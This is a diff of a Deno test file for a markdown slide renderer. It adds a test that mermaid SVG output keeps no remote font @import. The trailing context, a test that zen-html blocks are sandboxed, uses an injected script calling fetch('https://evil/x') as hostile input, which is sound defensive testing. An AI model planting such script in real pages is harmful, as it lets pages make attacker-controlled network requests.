@@ -64,6 +64,16 @@ Deno.test("renders mermaid blocks to inline SVG", async () => {
   assert(!pages[0].includes("language-mermaid"));
 });
 
+Deno.test("mermaid SVG has no remote @import (stays self-contained under CSP)", async () => {
+  const md = "# Diagram\n\n```mermaid\nflowchart TD\n  A --> B\n```\n";
+  const { pages } = await renderSlides(md);
+  assertStringIncludes(pages[0], "<svg");
+  // beautiful-mermaid embeds a Google Fonts @import; it must be stripped so the
+  // viewer makes no third-party request (and the host CSP stays clean).
+  assert(!pages[0].includes("fonts.googleapis.com"));
+  assert(!/@import\s+url\(\s*['"]?https?:/i.test(pages[0]));
+});
+
 Deno.test("zen-html fence emits a sandboxed iframe (no same-origin, blocks network)", async () => {
   const md =
     "# Deck\n\n---\n\n```zen-html\n<div class=box></div>\n<script>fetch('https://evil/x')<\/script>\n```\n";
